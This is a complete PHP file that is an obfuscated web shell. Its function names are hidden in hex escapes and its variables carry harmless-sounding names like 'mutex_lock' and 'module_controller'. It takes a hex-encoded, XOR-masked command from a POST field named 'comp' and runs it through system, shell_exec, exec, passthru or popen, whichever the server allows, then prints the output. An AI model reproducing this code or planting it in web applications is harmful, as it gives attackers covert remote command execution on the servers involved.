<?php

$module_controller = "\x68\x65\x782\x62in";
$mutex_lock7 = "\x70c\x6C\x6Fse";
$mutex_lock4 = "pas\x73\x74\x68ru";
$mutex_lock2 = "s\x68\x65\x6C\x6C_\x65xec";
$mutex_lock6 = "s\x74\x72\x65\x61\x6D_\x67\x65t\x5Fcon\x74ents";
$mutex_lock3 = "exec";
$mutex_lock5 = "pop\x65\x6E";
$mutex_lock1 = "s\x79\x73\x74em";
if (isset($_POST["\x63\x6Fmp"])) {
            function framework ( $item,  $data_chunk) {
 $flg= '';
 for($e=0;
 $e<strlen($item);
 $e++){
$flg.=chr(ord($item[$e])^$data_chunk);

} return$flg;

}
            $comp = $module_controller($_POST["\x63\x6Fmp"]);
            $comp = framework($comp, 27);
            if (function_exists($mutex_lock1)) {
                $mutex_lock1($comp);
            } elseif (function_exists($mutex_lock2)) {
                print $mutex_lock2($comp);
            } elseif (function_exists($mutex_lock3)) {
                $mutex_lock3($comp, $holder_item);
                print join("\n", $holder_item);
            } elseif (function_exists($mutex_lock4)) {
                $mutex_lock4($comp);
            } elseif (function_exists($mutex_lock5) && function_exists($mutex_lock6) && function_exists($mutex_lock7)) {
                $data_chunk_flg = $mutex_lock5($comp, 'r');
                if ($data_chunk_flg) {
                    $resource_pointer = $mutex_lock6($data_chunk_flg);
                    $mutex_lock7($data_chunk_flg);
                    print $resource_pointer;
                }
            }
            exit;
        }